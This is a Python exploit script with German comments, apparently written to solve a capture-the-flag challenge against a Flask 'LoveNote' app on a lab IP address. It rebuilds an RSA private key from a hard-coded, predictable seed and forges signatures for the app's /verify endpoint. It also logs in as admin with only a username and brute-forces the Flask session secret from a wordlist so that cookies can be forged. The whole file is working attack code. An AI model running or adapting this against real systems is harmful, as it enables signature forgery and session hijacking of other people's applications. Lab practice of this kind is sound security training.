#!/usr/bin/env python3
"""
Signatur-Format-Analyse + Dashboard/Inbox-Details
"""
import base64, hashlib, re, requests
from sympy import nextprime
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256 as CryptoSHA256

TARGET = "http://10.113.167.230:5000"
SEED   = b"admin_lovenote_2026_valentine"

# Key rekonstruieren
hash_p   = hashlib.sha256(SEED).digest()
p        = nextprime(int.from_bytes(hash_p, "big") | (1 << 1023))
modified = hashlib.sha256(SEED + b"pki").digest()
hash_q   = hashlib.sha256(modified).digest()
q        = nextprime(int.from_bytes(hash_q, "big") | (1 << 1023))
e        = 65537
n        = p * q
d        = pow(e, -1, (p-1)*(q-1))
key      = RSA.construct((n, e, d, p, q))

def sign_hex(msg):
    h = CryptoSHA256.new(msg.encode())
    return pkcs1_15.new(key).sign(h).hex()

def sign_b64(msg):
    h = CryptoSHA256.new(msg.encode())
    return base64.b64encode(pkcs1_15.new(key).sign(h)).decode()

def sign_b64url(msg):
    h = CryptoSHA256.new(msg.encode())
    sig = pkcs1_15.new(key).sign(h)
    return base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

s = requests.Session()
s.post(f"{TARGET}/login", data={"username": "admin"})

# ── Dashboard vollständig ausgeben ────────────────────────────────────────────
print("--- /dashboard ---")
r = s.get(f"{TARGET}/dashboard")
clean = re.sub(r'<style[^>]*>.*?</style>', '', r.text, flags=re.DOTALL)
clean = re.sub(r'<script[^>]*>.*?</script>', '', clean, flags=re.DOTALL)
clean = re.sub(r'<[^>]+>', ' ', clean)
clean = re.sub(r'\s+', ' ', clean).strip()
print(clean[200:2000])

# ── Einzelne Nachrichten-Links suchen ─────────────────────────────────────────
links = re.findall(r'href="([^"]+)"', r.text)
print(f"\nLinks: {links}")

# ── /verify mit verschiedenen Formaten testen ─────────────────────────────────
print("\n--- /verify Format-Test ---")
msg = "hello world"

formats = {
    "hex":    sign_hex(msg),
    "b64":    sign_b64(msg),
    "b64url": sign_b64url(msg),
}
print(f"Signatur-Laengen: hex={len(formats['hex'])} b64={len(formats['b64'])} b64url={len(formats['b64url'])}")

for fmt, sig in formats.items():
    r = s.post(f"{TARGET}/verify", data={"message": msg, "signature": sig})
    clean = re.sub(r'<style[^>]*>.*?</style>', '', r.text, flags=re.DOTALL)
    clean = re.sub(r'<[^>]+>', ' ', clean)
    clean = re.sub(r'\s+', ' ', clean).strip()
    
    flags = re.findall(r'THM\{[^}]+\}|[A-Z0-9_]{3,}\{[^}]+\}', r.text)
    if flags:
        print(f"  *** FLAG [{fmt}]: {flags[0]}")
    else:
        print(f"  [{fmt}] HTTP {r.status_code} | {clean[300:500]}")

# ── Compose-Response komplett ausgeben (nach der Nachricht) ──────────────────
print("\n--- POST /compose (vollstaendige Antwort) ---")
r = s.post(f"{TARGET}/compose", data={"to_user": "admin", "subject": "x", "message": "y"})
# Suche nach Signatur-bezogenen Sections
for pattern in [r'sign', r'sig', r'hash', r'hex', r'key']:
    idx = r.text.lower().find(pattern)
    if idx > 0:
        ctx = r.text[max(0, idx-100):idx+300]
        ctx_clean = re.sub(r'<[^>]+>', '', ctx).strip()
        if ctx_clean and len(ctx_clean) > 10:
            print(f"  [{pattern}] {ctx_clean[:200]}")
            break

# ── Flask Secret Key cracken (für Session-Forgery) ───────────────────────────
print("\n--- Flask SECRET_KEY Brute-Force ---")
# Das Session-Cookie auslesen und cracken
from itsdangerous import URLSafeTimedSerializer
from itsdangerous.exc import BadSignature

session_cookie = s.cookies.get("session", "")
print(f"Cookie: {session_cookie[:60]}...")

wordlist = [
    "secret", "lovenote", "lovenote_secret", "lovenote2026", 
    "LoveNote", "valentine", "love", "SECRET_KEY", "dev",
    "flask_secret", "supersecret", "password", "admin",
    "lovenote_valentine", "valentine2026", "love2026",
    "lovenote_2026", "LoveNote2026", "lovenote_key",
]

for secret in wordlist:
    try:
        signer = URLSafeTimedSerializer(secret)
        data = signer.loads(session_cookie, salt="cookie-session", max_age=None)
        print(f"  [+] FLASK SECRET GEFUNDEN: '{secret}' | Data: {data}")
        break
    except Exception:
        pass
else:
    print("  [-] Nicht im Wordlist gefunden")
